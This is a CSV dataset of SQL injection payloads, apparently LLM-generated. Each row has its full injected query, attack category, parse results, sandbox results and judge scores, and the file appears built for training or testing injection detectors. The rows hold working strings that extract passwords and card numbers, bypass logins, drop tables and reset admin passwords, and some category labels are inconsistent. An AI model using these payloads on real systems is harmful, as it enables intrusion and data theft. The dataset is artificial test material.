query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00080,"1' OR (SELECT COUNT(*) FROM users WHERE role='admin') > 0 UNION SELECT credit_card_number, cvv FROM payments --","SELECT * FROM users WHERE id = 1' OR (SELECT COUNT(*) FROM users WHERE role='admin') > 0 UNION SELECT credit_card_number, cvv FROM payments --",union_based,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Union"", ""Count"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00081,"[""' UNION SELECT username, password FROM users --""","SELECT * FROM orders WHERE status = '[""' UNION SELECT username, password FROM users --""' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00085,"-- WHERE status LIKE '%%' AND 1=2 UNION SELECT username ,  password FROM admin_panel/*","SELECT * FROM orders WHERE status = '-- WHERE status LIKE '%%' AND 1=2 UNION SELECT username ,  password FROM admin_panel/*' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00086,"' OR EXISTS(SELECT 1 FROM system_logins WHERE last_login_date > DATE_SUB(CURRENT_DATE, INTERVAL 1 MONTH))--","SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1 FROM system_logins WHERE last_login_date > DATE_SUB(CURRENT_DATE, INTERVAL 1 MONTH))--' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,"[""Var"", ""Table"", ""Exists"", ""Star"", ""GT"", ""Or"", ""DateSub"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Interval"", ""Where"", ""Literal"", ""CurrentDate"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00087,"[""' UNION SELECT t.username, t.password FROM (SELECT username, password FROM users WHERE 'a'='a') AS t;"", ""' OR 1=1 UNION SELECT u.email, u.phone_number FROM users AS u;"", ""--' UNION SELECT p.name, p.price FROM products AS p WHERE 'b'='b',""; ""'; WAITFOR DELAY '0:0:5' UNION SELECT c.credit_card_number, c.expiry_date FROM customer_details AS c;"", ""/*' UNION SELECT d.department_id, d.department_name FROM departments AS d WHERE 'c'='c'""]","SELECT * FROM orders WHERE status = '[""' UNION SELECT t.username, t.password FROM (SELECT username, password FROM users WHERE 'a'='a') AS t;"", ""' OR 1=1 UNION SELECT u.email, u.phone_number FROM users AS u;"", ""--' UNION SELECT p.name, p.price FROM products AS p WHERE 'b'='b',""; ""'; WAITFOR DELAY '0:0:5' UNION SELECT c.credit_card_number, c.expiry_date FROM customer_details AS c;"", ""/*' UNION SELECT d.department_id, d.department_name FROM departments AS d WHERE 'c'='c'""]' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,tsql,"[""Column"", ""Identifier""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00088,"' AND EXISTS(SELECT COUNT(*) FROM users WHERE username LIKE CONCAT(CHAR(67), CHAR(66))) --","INSERT INTO comments (user_id, body) VALUES (1, '' AND EXISTS(SELECT COUNT(*) FROM users WHERE username LIKE CONCAT(CHAR(67), CHAR(66))) --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Count"", ""Column"", ""EQ"", ""And"", ""From"", ""Identifier"", ""Like"", ""Select"", ""Where"", ""Literal"", ""Chr"", ""Concat""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00089,"-- OR 1=1 UNION ALL SELECT 'admin', NULL FROM users WHERE user_type='admin'","INSERT INTO comments (user_id, body) VALUES (1, '-- OR 1=1 UNION ALL SELECT 'admin', NULL FROM users WHERE user_type='admin'')",union_based,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00090,' OR 1=1; SELECT user_password FROM users WHERE user_id=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1; SELECT user_password FROM users WHERE user_id=1 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00091,' OR CAST((SELECT COUNT(*) FROM table1 WHERE column1=column2) AS VARCHAR) > 1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR CAST((SELECT COUNT(*) FROM table1 WHERE column1=column2) AS VARCHAR) > 1 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Cast"", ""GT"", ""Or"", ""Count"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""DataType"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00092,'; EXECUTE IMMEDIATE 'SELECT password FROM admin_login' --,"INSERT INTO comments (user_id, body) VALUES (1, ''; EXECUTE IMMEDIATE 'SELECT password FROM admin_login' --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00093,"' OR 1=1 UNION ALL SELECT username, password FROM users --","INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 UNION ALL SELECT username, password FROM users --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00094,' OR EXISTS(SELECT 1 FROM products ORDER BY price LIMIT 1 OFFSET 0) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM products ORDER BY price LIMIT 1 OFFSET 0) --')",union_based,comment_insert,1,0,0.0,True,default,"[""Offset"", ""Table"", ""Exists"", ""Star"", ""Order"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Limit"", ""Ordered"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00095,' OR cast((select sum(price) from orders) as char) > 1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR cast((select sum(price) from orders) as char) > 1 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Cast"", ""GT"", ""Or"", ""Sum"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""DataType"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00096,"-- OR 1=1 UNION ALL SELECT name, email FROM contacts WHERE company='example'","INSERT INTO comments (user_id, body) VALUES (1, '-- OR 1=1 UNION ALL SELECT name, email FROM contacts WHERE company='example'')",union_based,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00097,' OR (SELECT * FROM users WHERE id != 1 ORDER BY id LIMIT 1) IS NOT NULL --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT * FROM users WHERE id != 1 ORDER BY id LIMIT 1) IS NOT NULL --')",union_based,comment_insert,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Subquery"", ""Order"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Limit"", ""NEQ"", ""Ordered"", ""Select"", ""Is"", ""Not"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00098,' OR (SELECT COUNT(*) FROM info WHERE data > (SELECT MIN(data) FROM info)) > 0 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT COUNT(*) FROM info WHERE data > (SELECT MIN(data) FROM info)) > 0 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Count"", ""Min"", ""Column"", ""From"", ""Where"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00099,' OR (SELECT 1 FROM systeminfo WHERE sysname = 'Microsoft') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM systeminfo WHERE sysname = 'Microsoft') --')",union_based,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00100,1' AND EXISTS(SELECT * FROM sysobjects WHERE name LIKE '%users%') --,SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT * FROM sysobjects WHERE name LIKE '%users%') --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Like"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00101,' OR 'x'='x',SELECT * FROM users WHERE username = '' OR 'x'='x'' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00102,"1' UNION ALL SELECT NULL, 1, NULL, NULL--","SELECT * FROM users WHERE username = '1' UNION ALL SELECT NULL, 1, NULL, NULL--' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00104,' AND '1'='1',SELECT * FROM users WHERE username = '' AND '1'='1'' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00105,-- ' OR '--,SELECT * FROM users WHERE username = '-- ' OR '--' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00107,' AND EXISTS(SELECT * FROM information_schema.columns WHERE table_name = 'users'),SELECT * FROM users WHERE username = '' AND EXISTS(SELECT * FROM information_schema.columns WHERE table_name = 'users')' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00108,"--' OR ASCII(SUBSTRING(username, 1, 1)) > 96 --","SELECT * FROM users WHERE username = '--' OR ASCII(SUBSTRING(username, 1, 1)) > 96 --' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00110,'; DROP TABLE temp_table;--,SELECT * FROM users WHERE username = ''; DROP TABLE temp_table;--' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Drop"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00111,'; EXEC sp_password_reset 'admin';--,SELECT * FROM users WHERE username = ''; EXEC sp_password_reset 'admin';--' AND password = 'anything',blind_boolean,login,1,0,0.0,True,postgres,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00112,"' OR CAST(VERSION() AS CHAR(1))='5.7', --","SELECT * FROM products WHERE name LIKE '%' OR CAST(VERSION() AS CHAR(1))='5.7', --%'",blind_boolean,search,1,0,0.0,True,default,"[""DataTypeParam"", ""Table"", ""Star"", ""Anonymous"", ""Cast"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""DataType"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00113,"' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'), --","SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'), --%'",blind_boolean,search,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
